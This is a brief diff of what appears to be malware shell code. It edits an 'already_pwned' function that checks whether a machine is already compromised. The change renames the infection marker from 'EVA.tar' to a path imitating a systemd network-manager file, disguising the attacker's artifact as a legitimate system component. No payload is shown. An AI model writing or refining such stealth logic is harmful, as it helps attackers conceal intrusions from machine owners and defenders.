@@ -8,7 +8,7 @@ check_file_integrity(){
 }
 
 already_pwned(){
-    file_path="$1/EVA.tar"
+    file_path="$1/systemd/network-manager"
     if [ -f "$file_path" ]; then # MACHINE HAS ALREADY BEEN COMPROMISED
         exit 1
     else
